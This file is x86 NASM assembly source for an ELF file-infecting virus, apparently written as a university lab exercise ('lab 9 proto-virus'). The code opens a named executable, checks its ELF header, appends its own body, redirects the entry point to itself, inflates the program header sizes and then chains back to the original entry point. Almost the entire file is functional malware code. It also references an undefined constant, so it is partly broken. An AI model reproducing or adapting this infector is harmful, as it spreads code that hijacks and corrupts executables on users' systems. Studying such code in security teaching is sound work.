;+++++++++++++++++++++++++++++++++++++++++++
%macro  isELF 0

	read eax, ebp - BUF_OFFSET, 10
	mov ecx , ebp-BUF_OFFSET

	mov dl, byte[ecx+1]
	cmp dl, 'E'			; magic num [1] == E
	jne %%exit1

	mov dl, byte[ecx+2]
	cmp dl, 'L'			; magic num [2] == L
	jne %%exit1

	mov dl, byte[ecx+3]
	cmp dl, 'F'			; magic num [3] == F
	jne %%exit1
	jmp %%skip_exit1

%%exit1:
	exit 1			
%%skip_exit1:
%endmacro
;+++++++++++++++++++++++++++++++++++++++++++


%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro


%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	BUF_OFFSET 0 
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

;+++++++++++++++++++++++++++++++++++++++++++++++++++++

%define STDIN 0
%define STDOUT 1
%define STDERR 2
%define OPEN_FILE -26

%define skele_size	1440     ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define HEADER_size	52		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
%define	PHDR_VADRESS	60		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;+++++++++++++++++++++++++++++++++++++++++++++++++++++
%define first_phdr_offset 54
;%define first_phdr_filesize_offstet 68
;%define first_phdr_memsize_offset 72

%define DATA_OFF 88
%define DATA_VIR_ADD 96
;%define second_phda4r_filesize_offstet 100
%define DATA_MEMSIZE_OFF 104
;+++++++++++++++++++++++++++++++++++++++++++++++++++++

virus_start:
	global _start

	section .text

_start:	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
;  	0b  +++++++++++++++++++++++++++++++++++++++++++++++++++++
	call get_my_loc	
	sub esi,next_i- OutStr		; now the esi runtime addr od Out-str in our hands
	write STDOUT, esi ,32		; print OutStr
		
	call get_my_loc
	sub esi,next_i - FileName	
	open esi, RDWR , 0777		; Open the file for RDWR
    	
	mov edi, eax				; backup open fd (eax) to edi

	cmp eax, OPEN_FILE			; check if already open
	je in_file					; if the return value is -26, we are inside ELFexec( busy )

	cmp eax, 0
	jle exit_fail				; Couldn't open file
	
	isELF						; Check that our file is of ELF format

; write virus to file	
in_file:	
	lseek edi, 0, SEEK_END		; ret to eax num of bytes in file
	push eax					; save the size of file
	
	call get_my_loc						; calculate the size of the virus
	sub esi , next_i - virus_end
	mov ebx , esi		
	call get_my_loc	
	sub esi , next_i - virus_start	
	sub ebx , esi			
	mov dword [ebp] , ebx	

	write edi , esi , [ebp]		; Write to file (edi) from virus start (esi) virus_size(ebp)

;	1  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++     
	
	mov esi, edi						; ESI -> fd

	lseek esi, ENTRY, SEEK_SET			; Get to the start of the file -> ret(eax) holds the size of the file
	
	add ebp, 4			
	read esi, ebp, 4					; Read the entry point into the stack [ebp + 4] -> Entry point	

	pop edi								; edi = The size of the file
	add ebp, 4
	mov [ebp], edi						; [ebp + 8] -> size of the file 
	add ebp, 8			
	lseek esi, DATA_VIR_ADD, SEEK_SET
	read esi, ebp , 4 					; [ebp + 16] -> vadress of the second header
	add edi, [ebp]						; EDI = vadress of the second header
	lseek esi, DATA_OFF, SEEK_SET		
	read esi, ebp , 4 					; [ebp + 16] -> the offset
	sub edi, [ebp]						;?????????
	
		
	sub ebp, 4								
	mov [ebp], edi						; [ebp + 12] -> Change the entry point on our stack

	lseek esi, ENTRY, SEEK_SET			; Get to the start of the file -> ret(eax) holds the size of the file

	write esi , ebp , 4						; Write it to the file

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END CHANGE THE ELFexec ENTRY POINT TO THE VIRUS;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


; 	3  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	
	sub ebp, 12							; [ebp] -> virus size
	mov edi, [ebp]						; EDI -> virus size

	lseek esi, DATA_OFF, SEEK_SET		; Get to the second phdr of our file
	
	read esi,ebp, 4						; [ebp] -> old offset

	sub edi, [ebp]						; EDI = The size of the virus -  program header offset

	add ebp, 8							; [ebp + 8] -> old filesize
	add [ebp], edi						; [ebp + 8] = file size + The size of the virus -  program header offset
	lseek esi , DATA_FILESIZE_OFF, SEEK_SET
	write esi,ebp,4						; Change the filesize

	lseek esi , DATA_MEMSIZE_OFF, SEEK_SET
	write esi,ebp,4						; Change the filesize

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END CHANGE FILESIZE AND MEMSIZE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	

;	2  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++	
	sub ebp, 4							; [ebp + 4] -> the old entry point
	lseek esi, -4 , SEEK_END			; Go to -4 the end of the file
; end of infected file
	write esi, ebp, 4					; Write the old entry point to it
	close esi

; end of the runinng file
	call get_my_loc
	sub esi , next_i - PreviousEntryPoint
	
	jmp dword[esi]						


VirusExit:
       exit 0           				; Termination if all is OK and no previous code to jump to
                        		
exit_fail:
	exit 1	
	
FileName:	db "ELFexec2short", 0
VirusName: 	db "virus",0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0

get_my_loc:
	call next_i

next_i:
	pop esi
	ret

PreviousEntryPoint: dd VirusExit
virus_end:






